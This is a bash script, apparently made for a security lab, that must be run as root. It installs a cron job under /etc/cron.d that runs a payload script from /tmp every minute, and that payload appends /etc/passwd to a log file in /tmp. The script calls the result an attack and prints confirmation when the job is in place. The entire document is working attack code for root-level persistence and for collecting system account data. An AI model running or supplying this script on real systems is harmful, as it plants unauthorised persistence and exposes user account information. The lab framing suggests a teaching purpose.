#!/bin/bash
set -e  # Exit script if command fails

# File locations
CRON_FILE="/etc/cron.d/lab_exfil_job"
PAYLOAD="/tmp/lab_exfil.sh"

# Run the script as root
if [[ $EUID -ne 0 ]]; then
    echo "Run with sudo"
    exit 1
fi

# Creation of the actual payload script and  make it copy system user data to our log file
cat > "$PAYLOAD" <<'EOF'
#!/bin/bash
cat /etc/passwd >> /tmp/exfil.log  
EOF

# Make the payload able to be executed
chmod +x "$PAYLOAD"

# Create cron job and set it to run every minute
cat > "$CRON_FILE" <<EOF
* * * * * root $PAYLOAD
EOF

# Set permissions
chmod 644 "$CRON_FILE"

# Confirm attack worked
echo "[+] Attack created:"
echo "  Cron file: $CRON_FILE"
echo "  Payload: $PAYLOAD"